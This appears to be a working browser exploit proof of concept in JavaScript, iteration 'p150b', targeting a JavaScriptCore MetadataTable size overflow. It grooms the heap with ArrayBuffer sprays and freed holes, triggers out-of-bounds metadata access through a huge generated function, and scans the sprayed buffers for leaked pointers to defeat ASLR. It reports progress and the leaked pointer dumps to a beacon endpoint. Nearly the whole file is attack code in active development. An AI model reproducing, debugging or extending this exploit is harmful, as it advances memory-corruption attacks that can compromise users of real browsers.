// p150b — MetadataTable overflow: zeroed spray + throwing callback
//
// PROVEN: finishCreation() allocates 100KB buffer (wrapped from 4.29GB).
// OOB happens during LLInt EXECUTION, not compilation (p149g confirmed).
// p150a crashed because OOB metadata reads dereference garbage pointers.
//
// FIX: Spray zeroed 100KB ArrayBuffers AFTER metadata buffer.
// OOB reads hit zeros → null CallLinkInfo → LLInt slow path → no crash.
// Slow path resolves call target → WRITES real pointer into metadata entry.
// That metadata entry is inside our spray AB → we READ the pointer = ASLR leak.
//
// Strategy:
// 1. Spray 60 × 100096B zeroed ArrayBuffers
// 2. Free alternating (create holes for metadata buffer)
// 3. GC pressure to consolidate
// 4. Compile 38M op_call function (metadata fills a hole)
// 5. Call function with callback that throws at call N
// 6. Scan spray ABs for non-zero values = leaked pointers
//
// Beacon prefix: V150B-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150B-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V150B-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var BUF_SZ = 100096; // Wrapped metadata buffer size
  var SPRAY_N = 60;
  var THROW_AT = 1200; // Throw after ~300 OOB calls (893 in-bounds + 307 OOB)

  // ---- PHASE 1: Spray zeroed ArrayBuffers ----
  var sprays = [];
  var sprayViews = [];
  for (var i = 0; i < SPRAY_N; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    // Leave as ZEROS — this is the point. OOB reads hit zeros = safe slow path.
    sprays.push(ab);
    sprayViews.push(new Uint8Array(ab));
  }
  B('SPRAY-' + SPRAY_N);

  // ---- PHASE 2: Free alternating to create holes ----
  var keptIndices = [];
  for (var i = 0; i < SPRAY_N; i++) {
    if (i % 2 === 0) {
      sprays[i] = null;
      sprayViews[i] = null;
    } else {
      keptIndices.push(i);
    }
  }
  B('HOLES-' + (SPRAY_N / 2));

  // ---- PHASE 3: GC pressure ----
  var gcR = 0;
  function gcP() {
    try {
      for (var g = 0; g < 300; g++) { var t = new ArrayBuffer(8192); t = null; }
    } catch (e) {}
    gcR++;
    if (gcR < 20) { setTimeout(gcP, 30); }
    else { B('GC-DONE'); phaseBuild(); }
  }
  gcP();

  // ---- PHASE 4: Build the 38M op_call function ----
  function phaseBuild() {
    var N = 38348816;
    B('BUILD-N' + N);

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    // The function takes 'a' as callback parameter
    parts[0] = 'window.__p150fn=function(a){var c=0;';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p150ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      var ok = window.__p150ok ? 'OK' : 'FAIL';
      B('COMPILED-' + ok);
      if (ok === 'OK') {
        // Wait a beat for memory to settle, then call
        setTimeout(phaseCall, 200);
      }
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ---- PHASE 5: Call with throwing callback ----
  function phaseCall() {
    B('CALL-START-THROW-AT-' + THROW_AT);

    var callCount = 0;
    var threw = false;

    try {
      window.__p150fn(function() {
        callCount++;
        // Beacon at milestones
        if (callCount === 100) B('M-100');
        if (callCount === 500) B('M-500');
        if (callCount === 893) B('M-893-LAST-INBOUNDS');
        if (callCount === 894) B('M-894-FIRST-OOB');
        if (callCount === 1000) B('M-1000');

        if (callCount >= THROW_AT) {
          threw = true;
          throw new Error('p150b-bail');
        }
      });
      // If we get here, all 38M calls completed (unlikely)
      B('CALL-COMPLETED-ALL-' + callCount);
    } catch (e) {
      B('THREW-AT-' + callCount + '-' + e.message);
    }

    if (threw || callCount > 0) {
      B('TOTAL-CALLS-' + callCount);
      setTimeout(phaseScan, 100);
    } else {
      B('NO-CALLS');
    }
  }

  // ---- PHASE 6: Scan spray ABs for non-zero values (leaked pointers) ----
  function phaseScan() {
    B('SCAN-START');

    var hitABs = 0;
    var totalNonZero = 0;

    for (var ki = 0; ki < keptIndices.length; ki++) {
      var idx = keptIndices[ki];
      var view = sprayViews[idx];
      if (!view) continue;

      var nonZero = 0;
      var firstOff = -1;

      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nonZero++;
        }
      }

      if (nonZero > 0) {
        hitABs++;
        totalNonZero += nonZero;
        B('HIT-' + idx + '-nz=' + nonZero + '-f=' + firstOff);

        // Dump first 3 metadata-aligned 112-byte blocks with data
        var dumped = 0;
        for (var e = 0; e < view.length - 112 && dumped < 3; e += 112) {
          var hasData = false;
          for (var c = e; c < e + 112; c++) {
            if (view[c] !== 0) { hasData = true; break; }
          }
          if (!hasData) continue;
          dumped++;

          // Hex dump first 56 bytes of this entry
          var h1 = '';
          for (var b = e; b < e + 56; b++) h1 += hexByte(view[b]);
          B('E' + idx + '@' + e + 'a-' + h1);

          // And bytes 56-112
          var h2 = '';
          for (var b2 = e + 56; b2 < e + 112; b2++) h2 += hexByte(view[b2]);
          B('E' + idx + '@' + e + 'b-' + h2);

          // Extract potential pointers (8-byte values at 8-byte offsets)
          var ptrs = '';
          for (var p = 0; p < 112; p += 8) {
            var nonZ = false;
            for (var v2 = 0; v2 < 8; v2++) {
              if (view[e + p + v2] !== 0) { nonZ = true; break; }
            }
            if (nonZ) {
              var hex8 = '';
              // Little-endian: read bytes in reverse for pointer value
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[e + p + h]);
              ptrs += 'o' + p + ':' + hex8 + ' ';
            }
          }
          if (ptrs) BP('P' + idx + '@' + e, ptrs.trim());
        }

        // Count fully-written 112-byte entries
        var fullEntries = 0;
        for (var e2 = 0; e2 + 112 <= view.length; e2 += 112) {
          var anyData = false;
          for (var c2 = e2; c2 < e2 + 8; c2++) {
            if (view[c2] !== 0) { anyData = true; break; }
          }
          if (anyData) fullEntries++;
        }
        B('FULL-' + idx + '-' + fullEntries);
      }
    }

    B('DONE-hitABs=' + hitABs + '-totalNZ=' + totalNonZero);

    if (hitABs === 0) {
      B('NO-HITS-CHECK-LAYOUT');
      // Diagnostic: check if function still exists
      if (window.__p150fn) {
        B('FN-EXISTS');
        try {
          B('FN-LEN-' + window.__p150fn.toString().length);
        } catch (e) {
          B('FN-TOSTR-ERR');
        }
      }
    }
  }
})();
